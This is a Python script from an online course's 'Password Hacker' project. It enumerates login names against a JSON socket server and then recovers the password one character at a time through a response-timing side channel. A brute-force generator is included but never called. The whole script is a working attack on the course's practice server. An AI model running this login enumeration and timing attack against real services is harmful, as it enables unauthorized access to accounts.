# Password Hacker (Python) 
# https://github.com/imprvhub/passwordhacker-jbrains 
# Project Completed By Iván Luna, August 8, 2023 
# For Hyperskill (Jet Brains Academy). Course: Python Core

import sys
import socket
import string
import itertools
import json
from datetime import datetime


class ClientSocket:
    def __init__(self):
        self.hostname = sys.argv[1]
        self.port = int(sys.argv[2])
        self.pas = ""

    def connect_with_json(self):
        with socket.socket() as client:
            address = (self.hostname, self.port)
            client.connect(address)
            path_to_logins = ""
            with open(path_to_logins, "r") as file:
                logins = iter(file.read().split())
                for login in logins:
                    login = login.strip()
                    log_dict = {"login": login, "password": " "}
                    data = json.dumps(log_dict)
                    client.send(data.encode())
                    result = client.recv(1024).decode()
                    result_dict = json.loads(result)
                    if result_dict["result"] == "Wrong password!":
                        log_dict = json.loads(data)
                        self.login = log_dict["login"]
                        break
            symbols = string.ascii_letters + "0123456789"
            while True:
                for let in symbols:
                    log_dict = {"login": self.login, "password": self.pas + let}
                    data = json.dumps(log_dict, indent=4)
                    client.send(data.encode())
                    start = datetime.now()
                    result = client.recv(1024)
                    final = datetime.now()
                    result_dict = json.loads(result.decode())
                    if result_dict["result"] == "Wrong password!":
                        time_diff = final - start
                        if time_diff.total_seconds() >= 0.1:
                            self.pas += let
                    elif result_dict['result'] == 'Connection success!':
                        print(data)
                        sys.exit()

    @staticmethod
    def get_pswd_brute():
        symbols = string.ascii_lowercase + string.digits
        for i in range(1, len(symbols) + 1):
            for item in itertools.product(symbols, repeat=i):
                yield item


clnt = ClientSocket()
clnt.connect_with_json()
